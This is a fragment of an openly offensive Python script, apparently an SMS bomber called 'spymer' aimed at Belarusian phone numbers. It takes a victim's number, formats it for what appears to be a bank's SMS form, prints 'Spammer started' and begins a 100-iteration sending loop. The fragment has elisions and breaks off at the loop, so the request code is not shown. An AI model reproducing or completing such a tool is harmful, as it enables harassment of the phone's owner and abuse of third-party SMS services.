# Author: RuslanZanevskiy
class spymer:
	def main(self):
		import requests, random, datetime, sys, time, argparse, os
		from colorama import Fore, Back, Style
		print(Style.RESET_ALL)
		parser = argparse.ArgumentParser(prog='spymer', description="Только для Беларуси!")
		parser.add_argument('phonenum', metavar='phone', help='Телефонный номер (пример: 375339996677)')
		...
		iteration = 0			
		_phone9 = _phone[3:]
		_phoneAresBank = '+'+_phone[:3]+'('+_phone[3:5]+')'+_phone[5:8]+'-'+_phone[8:10]+'-'+_phone[10:12] #+375(33)999-66-77
		print(showstatus(wrapsbrace('info', True) + ('Отправка SMS на: +{}').format(_phone)))
		print('Спамер запущен.\nЕсли Вы хотите остановить - нажмите Ctrl+C.')
		iteration = 0
		while iteration < 100:
